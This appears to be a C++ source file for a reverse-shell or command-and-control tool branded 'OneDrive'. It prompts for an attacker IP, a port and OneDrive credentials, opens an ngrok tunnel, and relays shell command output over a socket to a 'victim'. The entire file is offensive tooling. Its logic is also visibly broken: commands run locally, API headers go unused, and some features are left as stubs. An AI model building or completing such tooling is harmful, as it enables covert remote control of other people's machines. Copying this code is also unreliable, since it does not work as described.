//g++ OneDrive.cpp -o OneDrive.o -lcurl -lssl -lcrypto -lpthread
#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <random>
#include <cstdlib>
#include <cstdio>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <vector>
#include <fstream>
#include <sstream>
#include <curl/curl.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/buffer.h>

using namespace std;

const string BLUE = "\033[94m";
const string GREEN = "\033[92m";
const string RED = "\033[91m";
const string YELLOW = "\033[93m";
const string RESET = "\033[0m";

// Function to get attacker information
string get_attacker_info() {
    string attacker_ip;
    cout << "[+] Enter the IP for the reverse shell: ";
    cin >> attacker_ip;
    return attacker_ip;
}

// Function to encrypt access token
string encrypt_access_token(const string& token) {
    string key;
    cout << "[+] Enter your AES key (must be 16, 24, or 32 bytes long): ";
    cin >> key;

    if (key.length() != 16 && key.length() != 24 && key.length() != 32) {
        cout << "[*] Invalid key length. AES key must be 16, 24, or 32 bytes long." << endl;
        exit(1);
    }

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        cerr << "Error creating EVP_CIPHER_CTX." << endl;
        exit(1);
    }

    // Initialize encryption operation
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, (unsigned char*)key.c_str(), NULL) != 1) {
        cerr << "Error initializing encryption." << endl;
        exit(1);
    }

    // Create buffer for encrypted data
    string encrypted(token.size() + EVP_CIPHER_block_size(EVP_aes_256_cbc()), '\0');
    int len;

    // Encrypt the data
    if (EVP_EncryptUpdate(ctx, (unsigned char*)&encrypted[0], &len, (unsigned char*)token.c_str(), token.length()) != 1) {
        cerr << "Error during encryption." << endl;
        exit(1);
    }

    int ciphertext_len = len;

    // Finalize the encryption
    if (EVP_EncryptFinal_ex(ctx, (unsigned char*)&encrypted[0] + len, &len) != 1) {
        cerr << "Error finalizing encryption." << endl;
        exit(1);
    }
    ciphertext_len += len;

    EVP_CIPHER_CTX_free(ctx);

    // Base64 encoding
    BIO* bio;
    BIO* b64;
    BUF_MEM* bufferPtr;

    b64 = BIO_new(BIO_f_base64());
    bio = BIO_new(BIO_s_mem());
    bio = BIO_push(b64, bio);
    BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);
    BIO_write(bio, encrypted.c_str(), ciphertext_len);
    BIO_flush(bio);
    BIO_get_mem_ptr(bio, &bufferPtr);
    BIO_set_close(bio, BIO_NOCLOSE);
    BIO_free_all(bio);

    return string(bufferPtr->data, bufferPtr->length);
}

// Function to execute a command and return the output
string execute_command(const string& command) {
    char buffer[128];
    string result;
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) {
        cerr << "popen() failed!" << endl;
        return "";
    }
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }
    pclose(pipe);
    return result;
}

// Main function
int main() {
    string access_token, secret_id, ip, port;
    cout << BLUE << R"(
                                     .*####=                                     
                                 *##############=                                
                              .####################                              
                             ########################                            
                       =**********####################                           
                     *****************################*                          
                   **********************#########*+++++++                       
                  **************************##*++++++++++++++                    
                 =************************+====+++++++++++++++:                  
                 ********************+===========++++++++++++++:                 
                 ****************====================+++++++++++                 
                 -**********+===========================++++++++                 
                  ******===================================++++-                 
                   +==========================================+                  
                     ========================================:                   
                       .==================================+                      
                                                                                 
            ________                ________         __              
            \_____  \   ____   ____ \______ \_______|__|__  __ ____  
              /   |   \ /    \_/ __ \ |    |  \_  __ \  \  \/ // __ \ 
             /    |    \   |  \  ___/ |    `   \  | \/  |\   /\  ___/ 
             \_______  /___|  /\___  >_______  /__|  |__| \_/  \___  >
                      \/     \/     \/        \/                   \/ 
      ⠀⠀
)" << RESET;

    cout << "[+] Enter your OneDrive Application (client) ID: ";
    cin >> access_token;
    cout << "[+] Enter your OneDrive Secret ID: ";
    cin >> secret_id;
    ip = get_attacker_info();
    cout << "[+] Enter the port number for the reverse shell and ngrok: ";
    cin >> port;

    cout << GREEN << "[*] Starting ngrok tunnel..." << RESET << endl;
    string ngrok_command = "ngrok tcp " + port;
    system(ngrok_command.c_str());
    this_thread::sleep_for(chrono::seconds(3));  // Give ngrok some time to establish the tunnel

    string access_token_encrypted = encrypt_access_token(access_token);

    // Define headers for OneDrive API
    struct curl_slist* headers = nullptr;
    headers = curl_slist_append(headers, ("Authorization: Bearer " + access_token_encrypted).c_str());
    headers = curl_slist_append(headers, "Content-Type: application/json");
    headers = curl_slist_append(headers, "User-Agent: OneDrive-API-Client/1.0");
    headers = curl_slist_append(headers, "Connection: keep-alive");
    headers = curl_slist_append(headers, "Accept-Encoding: gzip, deflate, br");
    headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.9");
    headers = curl_slist_append(headers, ("X-Drive-Client-Secret: " + secret_id).c_str());

    // Create socket
    int server_fd, client_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        cerr << "Socket creation error" << endl;
        return -1;
    }

    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) {
        cerr << "setsockopt error" << endl;
        return -1;
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr(ip.c_str());
    address.sin_port = htons(stoi(port));

    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        cerr << "Bind failed" << endl;
        return -1;
    }

    if (listen(server_fd, 3) < 0) {
        cerr << "Listen failed" << endl;
        return -1;
    }

    cout << YELLOW << "[!] Waiting for incoming connection..." << RESET << endl;
    if ((client_socket = accept(server_fd, (struct sockaddr*)&address, (socklen_t*)&addrlen)) < 0) {
        cerr << "Accept failed" << endl;
        return -1;
    }

    // Main loop
    while (true) {
        string command;
        cout << RED << "[*] Bear>> " << RESET;
        getline(cin, command);
        if (command == "exit") {
            break;
        }

        this_thread::sleep_for(chrono::milliseconds(rand() % 4000 + 1000));

        string result = execute_command(command);
        send(client_socket, command.c_str(), command.length(), 0);

        if (!result.empty()) {
            cout << GREEN << result << RESET;
            cout << GREEN << "[+] Command executed successfully!" << RESET;
            send(client_socket, result.c_str(), result.length(), 0);
        } else {
            cout << RED << "[!] No output returned from the victim's machine." << RESET;
        }

        // Additional commands (screen, upload, download, get, remove, add, list_folder)
        // Implement additional command handling here...
    }

    // Close sockets
    close(client_socket);
    close(server_fd);

    return 0;
}

